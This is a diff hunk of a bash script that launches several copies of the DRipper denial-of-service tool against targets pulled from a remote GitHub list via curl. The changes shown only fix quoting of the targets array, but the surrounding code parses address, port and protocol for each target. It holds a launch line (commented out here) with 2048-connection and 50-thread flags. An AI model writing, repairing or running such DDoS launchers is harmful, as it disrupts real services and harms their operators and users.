@@ -47,7 +47,8 @@ do
    # Launch several copies of DRipper.
    for i in $random_numbers
       do
-             echo "array: "$targets
+             echo "array: " "$targets"
+             echo "array: " "${targets[@]}"
              # Get address, port and protocol from pre-selected targetle
              site=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/DRipper_targets | cat)")
              echo $site
@@ -58,7 +59,7 @@ do
              port=$(echo $site | awk '{print $2}')
              prot=$(echo $site | awk '{print $3}')
 
-             targets+=('$addr')
+             targets+=("${addr}")
 
              # Launch DRipper
              #python3 -u ~/russia_ddos/DRipper.py -l 2048 -s $addr -p $port -m $prot -t 50&
